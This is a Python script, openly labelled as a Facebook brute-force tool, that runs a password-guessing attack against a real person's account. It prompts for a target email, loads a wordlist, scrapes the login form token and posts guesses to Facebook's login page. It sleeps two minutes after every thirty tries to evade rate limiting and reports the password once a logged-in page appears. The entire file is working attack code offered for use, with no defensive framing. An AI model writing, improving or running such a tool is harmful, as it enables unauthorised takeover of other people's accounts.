"""Bruteforce attack facebook - python
"""

from colorama import Fore, init
from bs4 import BeautifulSoup, Tag
import requests
import time
import math
import sys
import os

init(autoreset=True)

if sys.version_info[0] < 3:
    print(f"{Fore.LIGHTRED_EX}Python version ≥3 is required")
    sys.exit(1)


class BruteForce:
    "BruteForce Attack Facebook"

    def __init__(self) -> None:
        "Initialize Class BruteForce"
        self.form: dict = {}
        self.cookies: dict[str, str] = {
            "fr": "0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy"
        }
        self.PASSWORD_FILE: str = "wordlist.txt"
        self.USER_PASSWORD_FILE: str = ""
        self.MIN_LENGTH: int = 6
        self.POST_URL: str = "https://www.facebook.com/login.php"
        self.HEADERS: dict[str, str] = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        }
        self.PAYLOAD: dict = {}
        self.COOKIES: dict = {}
        self.prev_size: int = 0

    def __getForm(self) -> tuple[dict]:
        "Get FormData for Facebook"
        data: requests.Response = requests.get(self.POST_URL, headers=self.HEADERS)
        for i in data.cookies:
            self.cookies[i.name] = i.value
        form: Tag = BeautifulSoup(data.text, "html.parser").form
        if form.input["name"] == "lsd":
            self.form["lsd"] = form.input["value"]
        return self.form, self.cookies

    def __isPassword(self, email: str, index: int, password: str) -> tuple[bool, str]:
        "Check for validity of password -- Correct or Incorrect Password"
        if index % 10 == 0:
            self.PAYLOAD, self.COOKIES = self.__getForm()
            self.PAYLOAD["email"] = email
        self.PAYLOAD["pass"] = password
        r: requests.Response = requests.post(
            self.POST_URL, data=self.PAYLOAD, cookies=self.COOKIES, headers=self.HEADERS
        )
        if (
            "Find Friends" in r.text
            or "security code" in r.text
            or "Two-factor authentication" in r.text
            or "Log Out" in r.text
        ):
            with open("logs.txt", "w") as file:
                file.write(str(r.content))
            return True, password
        return False, ""

    def __parse_argument(self, argument, default: any = None) -> any:
        "Check for Argument passed"
        argv = sys.argv[1:]
        if argument in argv:
            return argv[argv.index(argument) + 1]
        else:
            return default

    def __check_password_file(self, filepath) -> bool:
        "Check if the wordlist file exists"
        if os.path.isfile(filepath):
            return True
        return False

    def startGuessing(self, email: str) -> str | None:
        "Handle all the task for extracting password and return password if correct otherwise return None. Takes email:str as parameter"
        email = email.strip()
        password_file = self.__parse_argument("-w", self.PASSWORD_FILE)
        self.PASSWORD_FILE_LIST: set = set([password_file, self.PASSWORD_FILE])
        if not all(
            [self.__check_password_file(file) for file in self.PASSWORD_FILE_LIST]
        ):
            print(f"{Fore.LIGHTRED_EX}PASSWORD FILE(S) CANNOT BE FOUND")
        msg = "\n".join(self.PASSWORD_FILE_LIST)
        print(f"{Fore.CYAN}Selected Wordlist(s) are \n{msg}\n")
        password_data: list[str] = []
        for wordlist in self.PASSWORD_FILE_LIST:
            with open(wordlist, "r") as file:
                password_data.extend(file.read().split("\n"))
        size_ = len(password_data)
        print(
            f"{Fore.LIGHTBLUE_EX}Currently, there are {size_}s of potential passwords in wordlist(combined)."
        )
        counter = 0
        sub_counter = 1
        print()
        for index, password_ in enumerate(password_data):
            password_ = password_.strip()
            if len(password_) < self.MIN_LENGTH:
                continue
            message = f"{Fore.WHITE}[PASSWORD] {Fore.MAGENTA}[{index + 1}] {Fore.LIGHTGREEN_EX}{password_}"
            print(f"\r\033[0K\033[1A{Fore.LIGHTGREEN_EX}{message:<{self.prev_size}}")
            self.prev_size = len(message)
            if counter >= 29:
                time_count = 2 * 60
                while time_count >= 1:
                    message = f"\033[0K{Fore.WHITE}[STATUS] {Fore.LIGHTYELLOW_EX}Sleeping for two minutes ({time_count} seconds left)"
                    print(f"\r{message}", end="")
                    time_count -= 1
                    time.sleep(1)
                else:
                    counter = 0
            else:
                if sub_counter > 3:
                    sub_counter = 1
                end_dot = "." * sub_counter
                message = f"\033[0K{Fore.WHITE}[STATUS] {Fore.LIGHTYELLOW_EX}Sending request to {self.POST_URL}{end_dot}"
                print(f"\r{message}", end="")
                sub_counter += 1
            counter += 1
            status, passwd = self.__isPassword(email, index, password_)
            if status:
                return passwd
        else:
            return None

    def displayTitle(self):
        size = os.get_terminal_size().columns
        message = f"{Fore.LIGHTWHITE_EX}Welcome to {Fore.LIGHTBLUE_EX}Facebook{Fore.RESET} {Fore.LIGHTMAGENTA_EX}BruteForce"
        spacing = math.ceil(size / 2) + math.ceil(len(message) / 2) + 10
        print(f"\n{message:>{spacing}}\n\n")

    def takeEmail(self):
        email = input(
            f"\033[37m[TARGET] \033[36;1mWhat is the Target Email? → \033[32;3m"
        )
        print("\033[0m", end="")
        print(
            f"\033[1A\033[37m[TARGET] \033[36;1mThe Selected Email Address is → \033[32;3m{email}"
        )
        print("\033[0m", end="")
        return email

    def startHandShake(self):
        self.displayTitle()
        email = self.takeEmail()
        password_ = self.startGuessing(email.strip())
        if not password_ == None:
            print(
                f"\n{Fore.LIGHTGREEN_EX}Password for email {email} has been acquired\nThe password is {password_}\a\a\a"
            )
        else:
            print(
                f"\n{Fore.LIGHTRED_EX}Bruteforce attack failed. Cannot acquired password\a\a"
            )


if __name__ == "__main__":
    BruteForce().startHandShake()
